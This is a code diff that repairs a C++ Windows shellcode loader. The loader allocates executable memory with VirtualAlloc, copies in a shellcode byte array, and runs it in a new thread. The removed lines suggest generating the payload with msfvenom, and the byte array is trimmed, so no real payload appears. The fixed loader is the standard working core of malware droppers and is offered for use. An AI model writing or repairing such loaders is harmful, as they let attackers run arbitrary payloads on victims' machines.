@@ -1,40 +1,31 @@
 #include <windows.h>
-
 #include <iostream>
 
-// A placeholder for actual shellcode. Normally you'd generate this with msfvenom or
-// similar tools.
-
-unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8...";//trimmed for brevity
-
+unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8..."; // Seu shellcode aqui
 
 int main() {
-
-    void* exec = VirtualAlloc(
+    // Alocação correta de memória com permissão de execução
+    void* exec = VirtualAlloc(nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     
-    if(exec == nullptr){
-         std::cerr << "Failed to allocate memory."<< std::endl;
-    }
-         return 1;    
-)
-
-    memcpy(exec,shellcode,
-    sizeof(shellcode));
-
-    // Create a new thread
-    // that begins at the shellcode
-
-    Handle thread =
-    CreateThread(nullptr,0,
-    (LPTHREAD_START_ROUTINE)exec,nullptr,0,
-    nullptr);
-
-    if(thread == nullptr){
-        
+    if (exec == nullptr) {
+        std::cerr << "Falha ao alocar memoria." << std::endl;
         return 1;
     }
 
-    WaitForSingleObject(thread,INFINITE);
+    // Copia o shellcode para a memória alocada
+    memcpy(exec, shellcode, sizeof(shellcode));
 
+    // Cria a thread para executar o shellcode
+    HANDLE thread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)exec, nullptr, 0, nullptr);
+
+    if (thread == nullptr) {
+        std::cerr << "Falha ao criar thread." << std::endl;
+        return 1;
+    }
+
+    // Aguarda a execução terminar
+    WaitForSingleObject(thread, INFINITE);
+
+    CloseHandle(thread);
     return 0;
 }
